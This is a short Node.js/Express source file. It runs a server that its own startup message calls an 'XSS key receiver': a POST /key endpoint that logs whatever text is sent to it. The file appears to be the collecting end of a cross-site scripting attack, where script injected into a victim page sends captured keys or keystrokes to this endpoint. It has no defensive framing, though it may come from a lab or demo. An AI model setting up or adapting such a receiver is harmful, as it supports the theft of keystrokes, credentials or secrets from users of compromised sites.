import express from "express";

const port = 4000;
const app = express();

app.post("/key", express.text(), (req, res) => {
  if (typeof req.body === "string" && req.body !== "") console.log(req.body);
  res.end();
});

app.listen(port, () => {
  console.log(`XSS key receiver listening on http://localhost:${port}`);
});